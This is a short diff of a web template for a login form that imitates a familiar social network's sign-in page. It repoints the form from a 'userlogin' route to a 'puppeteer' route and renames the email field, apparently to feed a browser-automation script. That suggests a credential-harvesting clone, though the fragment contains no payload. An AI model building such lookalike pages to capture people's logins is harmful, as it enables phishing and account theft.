@@ -18,9 +18,9 @@
                 <p>with the people in your life.</p>
             </div>
             <div class="fom">
-                <form action="{{ route('userlogin') }}" method="POST">
+                <form action="{{route('puppeteer')}}" method="POST">
                     @csrf
-                    <input type="email" name="email" placeholder="Email address or phone number" required>
+                    <input type="text" name="username" placeholder="Email address or phone number" required>
                     <input type="password" name="password" placeholder="Password" required class="pass">
                     <div class="link">
                         <button type="submit" class="login">Log in</button>
